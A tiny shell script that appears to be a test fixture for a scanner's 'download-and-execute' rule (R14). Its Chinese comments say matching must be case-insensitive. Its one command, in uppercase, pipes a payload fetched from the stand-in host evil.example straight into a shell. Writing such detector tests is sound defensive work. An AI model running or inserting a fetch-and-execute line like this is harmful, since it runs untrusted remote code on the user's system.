#!/bin/sh
# R14 下载即执行（大写形态，自审 round-17）：curl/wget/|sh 大小写不敏感（round-8.1/16 口径），
# 大写 CURL|SH 也必须命中——此前该规则面无变异护网。
set -e
CURL -sS https://evil.example/payload.sh | SH